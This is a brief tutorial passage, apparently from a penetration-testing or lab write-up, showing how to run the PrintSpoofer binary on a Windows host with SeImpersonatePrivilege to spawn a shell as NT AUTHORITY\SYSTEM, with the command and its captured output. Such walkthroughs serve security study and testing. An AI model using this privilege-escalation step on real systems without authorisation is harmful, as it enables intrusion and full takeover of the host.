## Impersonating the Local SYSTEM Account with PrintSpoofer

after we have download the binary we just need to transfer it to our target and run the following command
```
command: .\spoofer64.exe -i -c cmd
```

# OUTPUT
```
C:\Users\Public\Desktop>spoofer.exe -i -c cmd
spoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.                                                                                                                                                                                          

C:\Windows\system32>whoami
whoami
nt authority\system 
```

## WE ARE DONE WITH PRINTSPOOFER BINARY HOPE U ENJOYED
